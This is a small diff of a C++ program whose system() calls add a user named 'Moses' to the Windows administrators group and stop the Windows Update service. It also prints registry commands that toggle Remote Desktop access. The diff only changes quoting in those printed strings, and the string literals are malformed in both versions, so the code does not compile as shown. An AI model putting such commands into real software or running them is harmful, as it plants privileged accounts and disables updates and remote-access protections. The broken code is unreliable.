@@ -20,9 +20,9 @@ int main()
     system("net localgroup administrators Moses /add");   // adds user as admin
     system("net stop wuauserv");
     cout << " \n\t Enables Remote Desktop:"
-         << "reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f";
+         << "reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f";
     cout << "\n\t Disables Remote Desktop:"
-         << "reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f";
+         << "reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 1 /f";
          
     return 0;
 }
